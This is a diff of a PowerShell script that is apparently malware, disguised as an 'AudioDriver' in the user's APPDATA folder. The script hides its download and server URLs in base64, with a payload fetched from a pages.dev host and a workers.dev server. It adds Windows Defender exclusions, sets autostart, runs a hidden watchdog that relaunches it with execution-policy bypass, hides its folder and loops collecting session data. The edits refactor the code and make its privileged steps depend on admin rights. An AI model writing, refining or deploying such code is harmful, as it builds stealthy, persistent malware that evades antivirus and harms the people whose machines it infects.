@@ -8,27 +8,20 @@ $mainPath = "$env:APPDATA\Microsoft\Windows\system_cache"
 $scriptPath = "$env:APPDATA\AudioDriver\A.ps1"
 $watchdogPath = "$env:APPDATA\AudioDriver\watchdog.ps1"
 $sessionDataDir = "$env:USERPROFILE\sessionData"
-function Decode-Url($base64) {
+function Use-UrlDecoder($base64) {
     return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
 }
-$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
-$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
-$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
-$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
-$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
+$releasesUrl = Use-UrlDecoder "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
+$pagesUrl    = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
+$serverUrl   = Use-UrlDecoder "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
+$versionURL  = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
+$payloadURL  = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
 New-Item -ItemType Directory -Force -Path $tempDir, $fileDumpDir, $videoSubDir | Out-Null
 $watchdogDir = Split-Path $watchdogPath
 if (!(Test-Path $watchdogDir)) {
     New-Item -ItemType Directory -Path $watchdogDir -Force | Out-Null
 }
-function Decode-Url($base64) {
-    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
-}
-$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
-$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
-$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
-$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
-$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
+
 Start-Transcript -Path "$tempDir\session.log" -Append
 
 function Test-Admin {
@@ -36,20 +29,21 @@ function Test-Admin {
         $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
         $principal = New-Object Security.Principal.WindowsPrincipal($identity)
         $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-        if (-not $isAdmin) {
-            $arguments = "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
-            Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
-            exit
-        }
-        return $true
+        $global:IsAdmin = $isAdmin
+        return $isAdmin
     } catch {
-        Write-Error "Failed to check or elevate to administrator: $_"
+        Write-Error "Failed to check admin: $_"
+        $global:IsAdmin = $false
         return $false
     }
 }
 
 
 function Set-DefenderExclusions {
+    if (-not $global:IsAdmin) {
+        Write-Verbose "Skipping Defender exclusions: not admin."
+        return
+    }
     try {
         $path = $MyInvocation.MyCommand.Path
         if ([string]::IsNullOrWhiteSpace($path)) {
@@ -179,13 +173,17 @@ function Set-Autostart {
 
 
 function Install-Watchdog {
+    if (-not $global:IsAdmin) {
+        Write-Verbose "Skipping watchdog task: not admin."
+        return
+    }
     if (!(Test-Path $watchdogPath)) {
         @"
 $ErrorActionPreference = "SilentlyContinue"
 while ($true) {
     $proc = Get-Process powershell | Where-Object { $_.Path -eq "SCRIPTPATH" }
     if (-not $proc) {
-        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File ""SCRIPTPATH""" -WindowStyle Hidden
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"SCRIPTPATH\"" -WindowStyle Hidden
     }
     Start-Sleep -Seconds 30
 }
@@ -516,7 +514,6 @@ Set-Autostart
 Install-Watchdog
 New-SetupLauncher
 Hide-Folder
-Hide-In-ADS
 
 while ($true) {
     Get-SessionData
